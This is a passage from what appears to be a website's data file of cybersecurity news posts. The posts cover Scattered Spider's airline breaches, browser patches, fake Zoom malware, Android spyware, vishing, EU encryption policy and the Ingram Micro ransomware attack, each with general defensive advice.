    <p>While these breaches vary in scope and method, they all rely on the group's signature weapon: <strong>highly targeted social engineering</strong> and <strong>multi-factor authentication (MFA) manipulation</strong>.</p>

    <h3>🕷️ Who Are Scattered Spider?</h3><br>
    <p>Scattered Spider (also known as UNC3944 or Octo Tempest) is a threat actor group composed mostly of teenagers and young adults, fluent in English and technically skilled. They operate under a loosely organized structure and are known for their precision, boldness, and focus on <strong>identity-based attacks</strong>.</p>
    
    <p>Previously, they’ve been linked to major incidents involving MGM Resorts, Caesars Entertainment, and several UK telecom providers. But their recent pivot toward aviation signals a growing ambition — and an increased threat to public infrastructure.</p>

    <h3>🧑‍💻 How They Operate: The Attack Chain</h3><br>
    <p>Scattered Spider doesn’t rely on malware in the traditional sense. Instead, they masterfully exploit human behavior:</p>
    <ol>
      <li><strong>Social Engineering:</strong> Impersonate employees using stolen credentials or fake ID badges</li>
      <li><strong>Help Desk Exploits:</strong> Call IT support to reset MFA or gain access to internal systems</li>
      <li><strong>MFA Fatigue:</strong> Send repeated login requests until users approve them out of annoyance</li>
      <li><strong>Persistence:</strong> Install legitimate remote access tools like AnyDesk or TeamViewer</li>
      <li><strong>Exfiltration:</strong> Access databases, leak files, or encrypt systems for ransom</li>
    </ol>
    <p>They operate with precision, often gathering LinkedIn data or internal IT manuals before striking.</p>

    <h3>🛩️ The Qantas Breach – A Case Study</h3><br>
    <p>Australia’s largest airline, <strong>Qantas</strong>, recently confirmed a data breach affecting nearly 6 million customers. The attackers accessed a third-party call center platform used to manage customer interactions.</p>
    <ul>
      <li>Leaked data includes full names, dates of birth, phone numbers, and frequent flyer numbers</li>
      <li>Qantas stated no passwords, passports, or financial info were compromised</li>
      <li>Security analysts suspect a Scattered Spider-style attack involving help desk impersonation</li>
    </ul>
    <p>This follows similar breaches at <strong>Hawaiian Airlines</strong> and <strong>WestJet</strong>, where attackers reportedly used voice phishing and fake IT personas to gain initial access.</p>

    <h3>🌐 Why the Airline Industry?</h3><br>
    <p>Airlines are attractive targets because:</p>
    <ul>
      <li>They hold massive databases of sensitive customer and travel data</li>
      <li>They rely heavily on third-party vendors with weaker defenses</li>
      <li>Operational delays and reputation damage create strong incentives to pay ransoms</li>
      <li>Call centers and remote workers are common attack vectors</li>
    </ul>
    <p>Additionally, the aviation sector is slow to update legacy systems, giving attackers ample room to move undetected.</p>

    <h3>🔐 What Can Be Done? Defending Against Scattered Spider</h3><br>
    <p>CISA and other global agencies have released urgent guidelines. Here’s what airlines and vendors must do:</p>
    <ul>
      <li><strong>Lock down help desk processes:</strong> Never approve password resets without full identity verification</li>
      <li><strong>Use phishing-resistant MFA:</strong> Like physical security keys (FIDO2)</li>
      <li><strong>Limit remote access:</strong> Disable unused accounts and review RMM tools like AnyDesk regularly</li>
      <li><strong>Segment networks:</strong> So that vendor and staff systems are isolated from core operations</li>
      <li><strong>Run regular simulations:</strong> To train staff on voice phishing and MFA fraud attempts</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The airline industry is not just a travel provider — it’s part of national critical infrastructure. A successful cyberattack can disrupt flights, leak data, damage trust, and even pose safety risks.</p>
    <p>With groups like Scattered Spider shifting targets, all major carriers — and even smaller regional airlines — must reevaluate their defenses. Prevention isn’t just about firewalls anymore. It’s about <strong>human awareness, identity protection, and zero-trust design</strong>.</p>

    <blockquote>Social engineering is the real malware. Train your people. Harden your policies. Don’t wait until your runway becomes a breach path.</blockquote>
  `},{id:"chrome-firefox-critical-update-june-2025",title:"Chrome 138 & Firefox 140 Security Updates: What You Need to Know",date:"2025-07-03",author:"EthicalByte",summary:"Google and Mozilla have released critical security updates for Chrome and Firefox, addressing over two dozen vulnerabilities—including high-severity memory flaws capable of remote code execution. This breakdown explains what’s been fixed, who’s at risk, and how to respond.",tags:["Chrome","Firefox","browser security","memory safety","vulnerability patch"],imageKey:"chromeFirefoxUpdate",content:`
    <p>On June 25, 2025, both Google and Mozilla launched major browser updates: <strong>Chrome 138</strong> and <strong>Firefox 140</strong>. These versions address a combined two dozen vulnerabilities—several of which are high-severity memory safety bugs that can lead to remote code execution. While there’s no confirmed active exploitation in the wild, the risk remains very real, and updating is crucial.</p>

    <h3>🔍 Chrome 138: Eleven Security Fixes</h3><br>
    <p>Chrome 138 brings 11 patches, including memory-related vulnerabilities and logic flaws in browser subsystems:</p>
    <ul>
      <li><strong>Use-after-free in Animation:</strong> Can cause memory corruption; a $4,000 bug bounty was awarded.</li>
      <li><strong>Insufficient policy enforcement in Loader:</strong> Potential for bypassing internal security checks.</li>
      <li><strong>Data validation flaw in DevTools:</strong> Could allow developers to leak or manipulate data—$1,000 reward.</li>
      <li>Other medium and low-level issues across V8, UI, and sandbox components.</li>
    </ul>
    <p>Chrome’s patch—versions 138.0.7204.49/50—reinforces key browser boundaries and safeguards memory handling.</p>

    <h3>🔐 Firefox 140: Thirteen Vulnerabilities Sealed</h3><br>
    <p>Released alongside updates for ESR versions 128.12 and 115.25, Firefox 140 includes fixes for 13 security flaws:</p>
    <ul>
      <li><strong>Use-after-free in FontFaceSet:</strong> Potentially exploitable for arbitrary code execution.</li>
      <li><strong>Memory corruption in media decoding:</strong> Enables remote code execution with malicious files.</li>
      <li>Other critical issues include UUID leaks through WebCompat, XSS via DevTools Save As, policy bypass bugs, and Android phishing loopholes.</li>
    </ul>
    <p>These patches close gaps that could be abused by specially crafted media or web sequences.</p>

    <h3>📌 Why These Updates Matter</h3><br>
    <ul>
      <li>Memory safety flaws allow deep control over browser processes—translating to high-risk remote exploits.</li>
      <li>Drive-by attacks using crafted scripts or media offer no-click compromise potential.</li>
      <li>Chrome and Firefox share core engine technologies—parallel vulnerabilities illustrate shared threat surfaces.</li>
    </ul>

    <h3>🛡️ What You Should Do Immediately</h3><br>
    <ol>
      <li><strong>Update Now:</strong>  
        – Chrome users: upgrade to version 138.0.7204.50+  
        – Firefox users: upgrade to version 140 (and ESR users to 128.12 or 115.25)</li>
      <li><strong>Restart Your Browser:</strong> Patches only take effect after a restart.</li>
      <li><strong>Enable Auto-Updates:</strong> Prevent delays in future patch rollouts.</li>
      <li><strong>Extend to All Browsers:</strong> Update Chromium-based alternatives like Edge, Brave, and Opera.</li>
      <li><strong>Deploy in Enterprise:</strong> IT teams should push patched versions across all endpoints quickly.</li>
    </ol>

    <h3>🔍 Broader Security Lessons</h3><br>
    <ul>
      <li>Frequent memory vulnerabilities show browser engines remain a lucrative exploit target.</li>
      <li>Strong update processes and education can block critical attack channels.</li>
      <li>Complement browser hardening with script control, threat detection, and DNS filtering.</li>
    </ul>

    <h3>🔚 Final Takeaway</h3><br>
    <p>These simultaneous updates from Chrome and Firefox emphasize that even widely-used software remains vulnerable—especially as attackers zero in on core browser components. While no active exploits have been confirmed, patching now offers the best defense. Make updating browsers a non-negotiable part of your cyber hygiene routine.</p>
  `},{id:"north-korea-fake-zoom-macos",title:"North Korean Hackers Spread MacOS Malware Using Fake Zoom Updates",date:"2025-07-04",author:"Ethical Byte",summary:"A new campaign by North Korean state-backed hackers targets MacOS users with malware disguised as Zoom updates. Learn how the attack works and how to stay protected.",tags:["north korea","macos","zoom","malware","social engineering","cyberattack"],imageKey:"northKoreaZoomMalware",content:`
    <h3>🎯 The New Threat: Fake Zoom Updates on MacOS</h3><br>
    <p>In July 2025, cybersecurity researchers uncovered a North Korean-sponsored campaign targeting MacOS users by distributing malware disguised as legitimate Zoom application updates. This attack is part of the group’s ongoing espionage operations aimed at stealing sensitive information from individuals and organizations worldwide.</p>

    <h3>👥 Who’s Behind It?</h3><br>
    <p>The attack is attributed to a threat actor known as <strong>Lazarus Group</strong> (also tracked as UNC4034 or APT37), a state-sponsored hacking group linked to North Korea. Lazarus is infamous for its sophisticated espionage campaigns, financial thefts, and disruption operations targeting governments, defense contractors, and researchers.</p>

    <h3>🧪 How the Attack Works</h3><br>
    <p>Researchers explain that the attackers set up fake websites or send phishing emails offering what appears to be a legitimate Zoom installer for MacOS. However, this installer is a Trojan: it installs malware alongside Zoom.</p>
    <ul>
      <li>The malware establishes persistence on the system by installing launch agents</li>
      <li>It opens a backdoor that allows remote command execution</li>
      <li>It can steal files, record keystrokes, and potentially activate webcams or microphones</li>
      <li>It communicates with command-and-control servers to receive additional payloads</li>
    </ul>

    <h3>🚪 Why MacOS?</h3><br>
    <p>Historically, attackers focused on Windows systems, but the rise in MacOS usage, especially among executives, journalists, and creatives, has made it an attractive target. Mac users often feel a false sense of security because malware on MacOS is less common — but this campaign proves that perception is dangerous.</p>

    <h3>🔎 Why Use Zoom as a Lure?</h3><br>
    <p>Zoom has become an indispensable tool for businesses and individuals worldwide, especially post-pandemic. Since users regularly receive prompts to update Zoom, attackers exploit this expectation to trick victims into installing malware without suspicion.</p>

    <h3>🛡️ How to Protect Yourself</h3><br>
    <p>If you’re a Mac user — or manage a fleet of Macs in your organization — here are practical steps to defend against this attack:</p>
    <ul>
      <li>Only download Zoom and other apps from official websites or app stores</li>
      <li>Enable Gatekeeper and System Integrity Protection (SIP) on your Mac</li>
      <li>Regularly check for unknown login items or launch agents in your system settings</li>
      <li>Keep MacOS and all software up-to-date</li>
      <li>Use endpoint security software capable of detecting MacOS malware</li>
    </ul>

    <h3>🌐 Impact on Organizations</h3><br>
    <p>Beyond individual users, this campaign highlights the risk to organizations that use BYOD (bring-your-own-device) policies or allow personal Macs on corporate networks. A single compromised Mac can act as a bridge into sensitive corporate environments.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>This incident is another reminder that <strong>MacOS is not immune</strong> to cyber threats. Attackers are creative and adaptive — they’ll exploit whatever platforms and habits make it easiest to breach their targets. Staying informed and cautious about where you download software is your best defense.</p>

    <blockquote>🚫 Don't fall for fake updates. Trust only official sources and question every download prompt.</blockquote>
  `},{id:"google-314m-cellular-data-verdict",title:"Google Ordered to Pay $314M for Misusing Android Users’ Cellular Data",date:"2025-07-05",author:"EthicalByte",summary:"A California jury has awarded $314 million to Android users after finding Google intentionally used cellular data from idle devices without consent. Learn what happened, the implications, and how to protect yourself.",tags:["Google","Android","mobile privacy","data misuse","legal verdict"],imageKey:"googleDataVerdict",content:`
    <p>In a landmark July 2025 verdict, a jury in San Jose, California, ruled that Google must pay over $314 million for using Android users’ cellular data when their devices were idle—without proper consent. The class-action case, representing about 14 million Californians, accused Google of unfair data collection practices that benefited the company while burdening users.</p>

    <h3>📊 What the Jury Decided</h3><br>
    <ul>
      <li>Google used cellular data—even when phones were idle or Wi‑Fi wasn’t enabled—to send and receive device information.</li>
      <li>The jury concluded these transfers were “mandatory and unavoidable,” giving Google an unfair advantage and costing users data from their plans.</li>
      <li>The verdict awards $314.6 million, but Google plans to appeal, arguing these data flows are necessary for Android’s security and performance and are disclosed in user agreements.</li>
    </ul>

    <h3>📱 How the Data Transfers Worked</h3><br>
    <p>These transfers occurred in the background—Android phones periodically sent usage logs, network statuses, and app activity to Google servers, regardless of user settings. One test found an idle device using nearly 9 MB of cellular data daily, predominantly communicating with Google even when stationary and unused.</p>

    <h3>🔍 Why This Verdict Matters</h3><br>
    <ul>
      <li><strong>Consumer rights spotlighted:</strong> The ruling reinforces that background data usage requires clear user consent—especially when not tied to Wi‑Fi.</li>
      <li><strong>Standard for tech accountability:</strong> This class-action may influence upcoming trials involving all other U.S. states in April 2026.</li>
      <li><strong>Privacy vs. convenience:</strong> The case highlights tensions between seamless device functionality and user control over data.</li>
    </ul>

    <h3>🛡️ How to Take Control of Your Data</h3><br>
    <ol>
      <li><strong>Monitor cellular usage:</strong> Regularly check your data meter for unexplained background consumption.</li>
      <li><strong>Adjust background settings:</strong> Disable background data for apps and enable “Wi‑Fi only” options in settings.</li>
      <li><strong>Review permissions:</strong> Audit apps accessing device logs or statuses and revoke unnecessary permissions.</li>
      <li><strong>Use data-saving tools:</strong> Employ built-in OS features or third-party apps that restrict idle background transfers.</li>
      <li><strong>Stay informed:</strong> Monitor court outcomes—especially the upcoming trial covering the other U.S. states.</li>
    </ol>

    <h3>⚖️ Google’s Response & What’s Next</h3><br>
    <p>Google contends that these processes support critical system operations—such as performance tuning, security monitoring, and diagnostics—and are disclosed in user agreements. The company will appeal the verdict, claiming the jury misunderstood these essential functions.</p>
    <p>Meanwhile, a broader national class-action is scheduled for April 2026. Should that case mirror California’s decision, the financial and regulatory impact on Google could increase significantly.</p>

    <h3>🔚 Final Takeaway</h3><br>
    <p>This verdict sends a powerful message: users deserve transparency and control over background data usage. Whether or not Google overturns the decision, it's a reminder to take charge of your data privacy—by monitoring usage, adjusting settings, and questioning what runs behind the scenes on your devices.</p>
  `},{id:"taiwan-chinese-apps-data-security",title:"Taiwan Flags Chinese Apps Over Data Security Risks Amid Rising Tensions",date:"2025-07-05",author:"Ethical Byte",summary:"Taiwanese authorities have issued a stern warning about Chinese-developed mobile apps, citing national security and personal privacy concerns. Here’s a comprehensive look at what’s happening and how to protect yourself.",tags:["taiwan","china","mobile security","data privacy","cybersecurity","apps"],imageKey:"taiwanChineseApps",content:`
    <h3>📱 Taiwan Steps Up Against Chinese Apps</h3><br>
    <p>In a move that underscores rising geopolitical and cybersecurity concerns, Taiwan’s National Communications Commission (NCC) and the Ministry of Digital Affairs have jointly warned citizens and businesses about installing and using Chinese-developed apps on their devices. Authorities point to serious risks — ranging from <strong>data harvesting</strong> to potential <strong>espionage</strong> — associated with these apps.</p>

    <h3>🌏 Why Now?</h3><br>
    <p>This warning comes amid heightened tensions across the Taiwan Strait and after several investigations revealed that popular Chinese apps were collecting and transmitting user data back to servers under Beijing’s jurisdiction. Officials described these apps as a possible gateway for surveillance and influence operations aimed at undermining Taiwan’s security and sovereignty.</p>

    <h3>🕵️ How Chinese Apps Collect Your Data</h3><br>
    <p>According to Taiwanese authorities and cybersecurity researchers, many Chinese apps:</p>
    <ul>
      <li>Request broad permissions — including access to camera, microphone, contacts, and location — even when not needed for app functionality</li>
      <li>Send collected data to servers in mainland China, often encrypted and out of reach of Taiwanese (or international) oversight</li>
      <li>Use complex, obfuscated code to mask their true behavior and evade detection</li>
      <li>Continue to track users even after uninstallation, thanks to hidden background services or browser-based trackers</li>
    </ul>

    <h3>⚖️ From Personal Privacy to National Security</h3><br>
    <p>While much of the focus is on personal data privacy, Taiwanese officials stress that these risks extend far beyond individuals. If sensitive devices belonging to government officials, military personnel, or critical infrastructure operators are compromised through such apps, the consequences could include espionage, sabotage, or manipulation of public opinion.</p>

    <p>This is consistent with findings from the U.S., India, and several EU nations, which have similarly restricted or banned Chinese apps in recent years.</p>

    <h3>🚨 Examples of At-Risk Apps</h3><br>
    <p>Although the advisory does not provide an exhaustive list, previous bans in other countries included these widely-used apps:</p>
    <ul>
      <li><strong>TikTok</strong> — for alleged data sharing with Chinese authorities</li>
      <li><strong>WeChat</strong> — for pervasive surveillance capabilities</li>
      <li><strong>QQ</strong> — for questionable encryption and data handling</li>
      <li><strong>CamScanner</strong> — previously found embedding malware in its code</li>
      <li><strong>UC Browser</strong> — for insecure data transmission practices</li>
    </ul>

    <h3>📊 The Bigger Picture: Data Sovereignty</h3><br>
    <p>This move also reflects Taiwan’s broader efforts to assert its <strong>digital sovereignty</strong> and protect its citizens’ data from falling into the hands of foreign powers. In a world where information equals power, letting sensitive data slip beyond your borders can have profound consequences — economically, politically, and even militarily.</p>

    <h3>🛡️ How You Can Protect Yourself</h3><br>
    <p>Here are actionable steps you can take to safeguard your data and reduce risk from questionable apps:</p>
    <ul>
      <li>📲 Download apps only from trusted developers and official app stores</li>
      <li>🔒 Review app permissions — revoke anything unnecessary (e.g., why does a flashlight app need your contacts?)</li>
      <li>🚫 Delete apps you no longer use or don’t trust</li>
      <li>🛡️ Use a mobile security suite capable of detecting privacy-invasive behavior</li>
      <li>🌐 Consider using a VPN to obscure your network traffic</li>
      <li>🔄 Keep your operating system and apps updated to close known vulnerabilities</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>As mobile apps become an integral part of daily life, it’s easy to overlook how much access we grant them — and by extension, their developers. Taiwan’s warning is not just about geopolitics; it’s a reminder that <strong>your privacy is your responsibility</strong>.</p>

    <p>Always ask yourself: who owns this app, where is my data going, and what would happen if it fell into the wrong hands?</p>

    <blockquote>📌 When it comes to apps and your data: trust is good — verification is better.</blockquote>
  `},{id:"catwatchful-android-spyware-leak",title:"Catwatchful Android Spyware Exposes 62,000 User Accounts in Massive Data Leak",date:"2025-07-06",author:"Ethical Byte",summary:"Cybersecurity researchers uncovered a sophisticated spyware campaign targeting Android devices, leaking sensitive data from over 62,000 victims. Learn how Catwatchful works, why it’s dangerous, and how to protect yourself.",tags:["android","spyware","catwatchful","data leak","mobile security","credential theft"],imageKey:"catwatchfulSpyware",content:`
    <h3>🐾 A Silent Predator: What Is Catwatchful?</h3><br>
    <p>In July 2025, researchers at Gbhackers uncovered a large-scale Android spyware campaign dubbed <strong>Catwatchful</strong>, responsible for stealing and leaking personal data from at least <strong>62,000 users worldwide</strong>. This malware has operated largely undetected for months, quietly siphoning data from victims' devices to an attacker-controlled server.</p>

    <p>Unlike simple adware or scams, Catwatchful is a <strong>persistent, highly invasive spyware</strong> that masquerades as legitimate apps and silently takes over the device.</p>

    <h3>📰 What Did Researchers Find?</h3><br>
    <p>The campaign came to light when cybersecurity teams discovered an <strong>unprotected server</strong> operated by the attackers, hosting an enormous trove of stolen credentials, call logs, messages, location data, and more. Researchers were able to analyze the leaked data and map the full scope of the campaign — which had already compromised tens of thousands of Android devices.</p>

    <p>The name <em>Catwatchful</em> comes from its stealthy, watchful behavior — quietly observing victims while keeping itself hidden from detection.</p>

    <h3>🎭 How Does Catwatchful Infect Devices?</h3><br>
    <p>The spyware is usually distributed as <strong>fake apps</strong> — often utilities, games, or social tools — that users download outside of the official Google Play Store. In particular, attackers rely on:</p>
    <ul>
      <li>Untrusted APK download sites and forums</li>
      <li>Malicious ads prompting users to “update” or “optimize” their phone</li>
      <li>Phishing SMS messages with malicious APK download links</li>
      <li>Social engineering tactics that promise exclusive content or discounts</li>
    </ul>

    <p>Once installed, the app requests a long list of permissions, including admin rights, making it very difficult to remove. Even after rebooting, the spyware remains active — recording data and transmitting it back to the attackers.</p>

    <h3>🔍 What Kind of Data Does It Steal?</h3><br>
    <p>Catwatchful is designed to harvest <strong>as much personal and sensitive information as possible</strong>. This includes:</p>
    <ul>
      <li>👤 Usernames, passwords, and saved login credentials</li>
      <li>📞 Call history, contact lists, and ongoing call recordings</li>
      <li>💬 SMS and instant messaging conversations</li>
      <li>📷 Photos, videos, and voice recordings</li>
      <li>🌍 GPS coordinates, movement patterns, and location history</li>
      <li>📱 Device information like IMEI, model, and network details</li>
    </ul>

    <p>The stolen data can be sold on dark web marketplaces, used for identity theft, or even exploited in targeted extortion campaigns.</p>

    <h3>🚨 Why Is This Campaign Alarming?</h3><br>
    <p>Catwatchful is notable for its:</p>
    <ul>
      <li>🌐 Global reach — affecting victims in dozens of countries</li>
      <li>📈 Scale — over 62,000 compromised accounts and growing</li>
      <li>🤐 Stealth — hiding in plain sight and avoiding detection by many antivirus tools</li>
      <li>💻 Attacker sloppiness — leaving the stolen data on an unsecured server, enabling discovery</li>
    </ul>

    <p>This shows not only how effective social engineering and sideloading attacks still are, but also how carelessly some attackers handle stolen data once collected.</p>

    <h3>🛡️ How You Can Stay Safe</h3><br>
    <p>Here’s how to defend yourself against Catwatchful and similar spyware campaigns:</p>
    <ul>
      <li>✅ Never download APKs from untrusted or unofficial sources</li>
      <li>✅ Enable Google Play Protect and use a reputable mobile security app</li>
      <li>✅ Review app permissions after installation — revoke unnecessary access</li>
      <li>✅ Don’t grant admin rights to apps you don’t fully trust</li>
      <li>✅ Keep your Android OS and apps updated with security patches</li>
      <li>✅ Regularly audit your device for suspicious apps or high data usage</li>
      <li>✅ Change passwords if you suspect compromise and enable multi-factor authentication (MFA)</li>
    </ul>

    <h3>🌟 Lessons for the Future</h3><br>
    <p>The Catwatchful incident reminds us that mobile devices are treasure troves of sensitive data — and attackers know it. With millions of Android users worldwide still sideloading apps and ignoring permissions, campaigns like Catwatchful are likely to continue thriving.</p>

    <p>Education, vigilance, and modern security tools are essential to keep your data and privacy intact.</p>

    <blockquote>🐾 A watchful cat sees everything — but so should you. Don’t let spyware stalk your phone.</blockquote>
  `},{id:"vishing-rise-australia-qantas-breach",title:"Vishing Attacks Surge in Australia Following Qantas Breach: How AI and Social Engineering Exploit the Human Factor",date:"2025-07-07",author:"Ethical Byte",summary:"Australia’s privacy watchdog reports a sharp rise in vishing attacks after the Qantas breach, exposing how attackers exploit trust and urgency to bypass digital defenses.",tags:["vishing","social engineering","qantas breach","ai phishing","australia","human factor"],imageKey:"vishingQantas",content:`
    <h3>📞 Vishing Is Back — and Smarter Than Ever</h3><br>
    <p>In the wake of the highly publicized <strong>Qantas data breach</strong>, Australia’s Office of the Australian Information Commissioner (OAIC) issued a sobering warning: <strong>vishing (voice phishing) attacks have surged by 46%</strong> nationwide.</p>

    <p>While much attention has focused on technical vulnerabilities, the Qantas breach highlights another critical weak spot — humans. Attackers are now using more sophisticated methods, even <strong>AI-generated voices</strong>, to trick employees into handing over access and data over the phone.</p>

    <h3>🔍 What Exactly Is Vishing?</h3><br>
    <p>Vishing — short for “voice phishing” — is a social engineering tactic where cybercriminals call their targets, posing as trusted figures such as IT support, managers, or even law enforcement. Their goal? To manipulate victims into providing sensitive information, approving access, or performing actions that compromise security.</p>

    <p>Recent vishing calls tied to the Qantas breach include:</p>
    <ul>
      <li>Posing as help desk technicians requesting login credentials to fix an “urgent outage”</li>
      <li>Imitating senior managers demanding immediate action to avoid penalties</li>
      <li>Using cloned AI voices to sound exactly like a known supervisor or coworker</li>
    </ul>

    <h3>🎭 Why Are Humans the Weakest Link?</h3><br>
    <p>Attackers rely on a few predictable human traits:</p>
    <ul>
      <li>⏳ <strong>Urgency</strong> — “We need this fixed NOW or the company loses money”</li>
      <li>🎩 <strong>Authority</strong> — “This is your manager. Just give me the password.”</li>
      <li>🤝 <strong>Trust</strong> — “I’m from IT. We spoke yesterday.”</li>
    </ul>

    <p>Combined with high stress environments, like customer support or call centers, these tactics often succeed — even against trained employees.</p>

    <h3>🧪 What’s New About These Attacks?</h3><br>
    <p>What makes this current wave of vishing more dangerous is the integration of <strong>artificial intelligence (AI)</strong>:</p>
    <ul>
      <li>🤖 AI voice cloning replicates tone, accent, and speech patterns of real people</li>
      <li>🎙️ Deepfake audio can even simulate conference calls or voicemails from executives</li>
      <li>📈 Attackers script dynamic, context-aware conversations instead of static pretexts</li>
    </ul>

    <p>This means employees can no longer rely on “recognizing the voice” or gut feeling alone to detect fraud.</p>

    <h3>📉 Lessons from the Qantas Breach</h3><br>
    <p>Investigators suspect that attackers gained initial access to Qantas systems by tricking a third-party call center employee via a vishing call. From there, they escalated privileges and moved laterally across networks, resulting in massive customer data exposure and operational disruption.</p>

    <p>This incident underlines the fact that even the best firewalls and endpoint protections can’t stop someone who’s verbally persuaded to open the door.</p>

    <h3>🛡️ OAIC’s Recommendations</h3><br>
    <p>The OAIC has outlined a set of best practices to defend against vishing:</p>
    <ul>
      <li>✅ Require <strong>multi-factor verification</strong> before making account changes or granting access</li>
      <li>✅ Educate employees about AI-enabled social engineering techniques</li>
      <li>✅ Empower staff to challenge and escalate suspicious calls without fear of reprimand</li>
      <li>✅ Enforce strict protocols for verifying the identity of callers requesting sensitive actions</li>
      <li>✅ Audit third-party vendors regularly and hold them to the same security standards</li>
      <li>✅ Deploy voice authentication or anomaly detection tools where applicable</li>
    </ul>

    <h3>🌎 Beyond Australia: A Global Concern</h3><br>
    <p>While this warning was issued in Australia, the threat is not limited by geography. Similar attacks have been reported in the U.S., U.K., and Asia — often tied to breaches in industries like aviation, finance, and healthcare.</p>

    <p>In our hyper-connected, high-pressure workplaces, anyone with a phone can be a target — and a gateway — for attackers.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The Qantas breach and subsequent vishing surge are stark reminders that cyber defense is not just about technology — it’s about people. The human element remains the most exploited vulnerability in security.</p>

    <p>Organizations that invest in awareness, clear policies, and support for employees who “pause and verify” will be far better positioned to fend off these attacks.</p>

    <blockquote>📞 Think before you speak. The voice on the line might not be who you think it is.</blockquote>
  `},{id:"eu-decrypt-private-data-protecteu",title:"The EU Wants to Decrypt Citizens’ Private Data by 2030: What It Means for Your Privacy",date:"2025-07-08",author:"Ethical Byte",summary:"The European Union’s ProtectEU plan proposes lawful access to encrypted communications by 2030 — sparking a heated debate on privacy, security, and human rights.",tags:["eu","encryption","privacy","surveillance","protecteu","human rights"],imageKey:"euProtectEU",content:`
    <h3>🔐 The EU’s ProtectEU Plan Explained</h3><br>
    <p>In July 2025, the European Union announced a controversial proposal under its <strong>ProtectEU initiative</strong> to grant law enforcement agencies <strong>lawful access to encrypted communications by 2030</strong>. The plan would effectively allow authorities to decrypt private messages sent through popular end-to-end encrypted (E2EE) platforms like <em>WhatsApp, Signal, iMessage, and others</em>.</p>

    <p>The EU argues that strong encryption—while vital for privacy—also enables criminals to operate in secrecy. ProtectEU is positioned as a way to combat <strong>child exploitation, terrorism, and organized crime</strong> without completely dismantling privacy protections.</p>

    <h3>🧪 How Would This Work?</h3><br>
    <p>The ProtectEU proposal envisions a future where technology firms build “<strong>lawful interception</strong>” solutions into their platforms, allowing authorized law enforcement—under a valid court order—to decrypt and access messages. This would require adding a <strong>backdoor mechanism</strong> to break E2EE on demand.</p>

    <h3>🕵️ Why Privacy Advocates Are Alarmed</h3><br>
    <p>Critics, including privacy groups, cybersecurity experts, and human rights organizations, argue that adding backdoors to encryption is fundamentally dangerous because:</p>
    <ul>
      <li>⚠️ <strong>Weakened Security:</strong> Any backdoor, no matter how well-intentioned, can be discovered and abused by hackers or hostile states.</li>
      <li>⚠️ <strong>Erosion of Trust:</strong> Users may stop using platforms perceived as insecure, undermining confidence in the digital ecosystem.</li>
      <li>⚠️ <strong>Scope Creep:</strong> Measures designed for one purpose (e.g., fighting terrorism) could expand to surveil dissent or target minorities.</li>
    </ul>

    <h3>⚖️ The EU’s Justification</h3><br>
    <p>The EU insists that:</p>
    <ul>
      <li>✅ Only <strong>authorized law enforcement</strong> with court oversight would have access.</li>
      <li>✅ ProtectEU aims to balance security and privacy via strict legal and technical controls.</li>
      <li>✅ They seek cooperation from tech companies to create solutions that minimize abuse risk.</li>
    </ul>

    <h3>🌍 What This Means for Users</h3><br>
    <p>If implemented, ProtectEU could reshape the way privacy and security are balanced across Europe — and potentially set a precedent globally. Users may see changes in:</p>
    <ul>
      <li>🔒 Encryption standards and app functionality</li>
      <li>📄 Privacy policies of communication platforms</li>
      <li>👀 Who can access their messages and under what conditions</li>
    </ul>

    <h3>🧠 Key Concerns & Potential Risks</h3><br>
    <ul>
      <li>Cybercriminals exploiting built-in backdoors</li>
      <li>Political misuse of surveillance powers</li>
      <li>Chilling effect on freedom of speech and journalism</li>
      <li>Fragmentation of global internet standards if users flee to services outside the EU</li>
    </ul>

    <h3>✅ What Can You Do?</h3><br>
    <p>Until ProtectEU becomes law (if it does), you can still protect your digital privacy:</p>
    <ul>
      <li>🔍 Stay informed about policy changes and debates.</li>
      <li>📣 Participate in public consultations, petitions, or advocacy efforts if you value strong encryption.</li>
      <li>🛑 Avoid platforms already weakening encryption or collecting excessive metadata.</li>
      <li>🗝️ Choose apps committed to robust, transparent, and zero-knowledge encryption as long as legally permitted.</li>
    </ul>

    <h3>🌟 Final Thoughts</h3><br>
    <p>The EU’s ProtectEU plan ignites an age-old debate: how much privacy are we willing to sacrifice for security? While stopping crime is essential, creating systemic weaknesses in encryption could endanger everyone — not just the guilty.</p>

    <blockquote>🔐 Privacy isn’t just about hiding something; it’s about protecting everyone. Once the backdoor is open, no one knows who will walk through it.</blockquote>
  `},{id:"ransomware-attack-ingram-micro-2025",title:"Ransomware Attack Disrupts Global Operations at Ingram Micro",date:"2025-07-09",author:"Ethical Byte",summary:"One of the world’s largest IT distributors, Ingram Micro, suffered a ransomware attack causing widespread outages, disrupting global supply chains, and raising serious questions about resilience in critical industries.",tags:["ransomware","ingram micro","supply chain","it distribution","incident response","cyber resilience"],imageKey:"ingramMicroRansomware",content:`
    <h3>💻 Ingram Micro Hit by Ransomware</h3><br>
    <p>Just before the July 4 holiday weekend, <strong>Ingram Micro</strong>, a critical player in global IT distribution, was targeted in a major <strong>ransomware attack</strong> that disrupted its systems and operations worldwide.</p>

    <p>The attack forced Ingram Micro to shut down parts of its network, halting customer order processing and some internal workflows to prevent further damage and limit the spread of malware. Law enforcement and cybersecurity experts were brought in immediately to investigate and assist with recovery.</p>

    <h3>🕵️ What We Know So Far</h3><br>
    <ul>
      <li>🏢 Ingram Micro confirmed its IT infrastructure was compromised by ransomware.</li>
      <li>📉 Systems handling procurement, logistics, and partner interactions went offline.</li>
      <li>🔎 No public evidence yet of stolen or leaked data, though investigations continue.</li>
      <li>⏳ Recovery is ongoing — while some services have been restored, full restoration is expected to take time.</li>
    </ul>

    <h3>🌎 Global Impact of the Outage</h3><br>
    <p>Ingram Micro’s role as an intermediary between manufacturers, resellers, and end customers means its disruption reverberates across the IT industry supply chain:</p>
    <ul>
      <li>🚫 Delays in fulfilling hardware & software orders.</li>
      <li>📦 Logistics bottlenecks for resellers & partners dependent on its distribution network.</li>
      <li>🌐 End customers experiencing extended lead times and order confusion.</li>
      <li>💰 Potential financial losses and contractual penalties for all involved parties.</li>
    </ul>

    <p>This incident highlights how a single cyberattack on a pivotal supplier can create a domino effect, disrupting hundreds or thousands of businesses downstream.</p>

    <h3>📣 Ingram Micro’s Response</h3><br>
    <p>In a statement, Ingram Micro emphasized their commitment to recovery and security:</p>
    <ul>
      <li>✅ “We are working diligently to restore operations securely and as quickly as possible.”</li>
      <li>✅ Law enforcement and third-party cybersecurity teams are involved in mitigation efforts.</li>
